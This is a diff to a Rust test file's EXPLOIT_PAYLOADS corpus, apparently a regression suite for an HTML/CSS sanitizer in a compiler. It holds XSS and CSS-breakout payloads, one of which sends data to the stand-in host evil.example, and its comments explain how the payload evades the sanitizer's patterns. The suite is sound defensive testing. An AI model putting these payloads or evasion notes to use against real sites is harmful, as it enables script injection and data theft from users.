@@ -69,11 +69,18 @@ const EXPLOIT_PAYLOADS: &[&str] = &[
     "x\", [alert(1)] : \"",
     // Design-token / CSS declaration-value breakout (security HIGH-2):
     // token values emit UNQUOTED into `--t1: <value>;` — `}` terminates the
-    // `:root` block, letting attacker CSS escape into the page. The
-    // `</style><script` re-open shape is terminated by the .omni lexer
-    // before lowering (compile error — safe outcome) but stays in the
-    // corpus as a record for the emitted-HTML guard.
-    "x; } body { background: url(https://evil.example/leak) }",
+    // `:root` block, letting attacker CSS escape into the page. The `alert(`
+    // marker MUST precede the exfil URL: the stripper treats the `//` in
+    // `url(https://…)` as a line comment, so a marker placed in the URL
+    // query (`?q=alert(1)`) is stripped away — a bare `}` escape alone is
+    // invisible to EXEC_PATTERNS/HTML_PATTERNS/TPL (review Important-1).
+    // `alert(` is not a `sanitize_css_value` blocked keyword
+    // (javascript:/document./etc. are), so the value survives sanitization
+    // and the residual carries `alert(`. The `</style><script` re-open
+    // shape is terminated by the .omni lexer before lowering (compile error
+    // — safe outcome) but stays in the corpus as a record for the
+    // emitted-HTML guard.
+    "x; } body { background: alert(1); url(https://evil.example/leak) }",
     "x</style><script>alert(1)</script>",
     // Unquoted inline-handler attribute (security HIGH-2 shape): a value
     // carrying `onmouseover=` without a quote forms a REAL handler
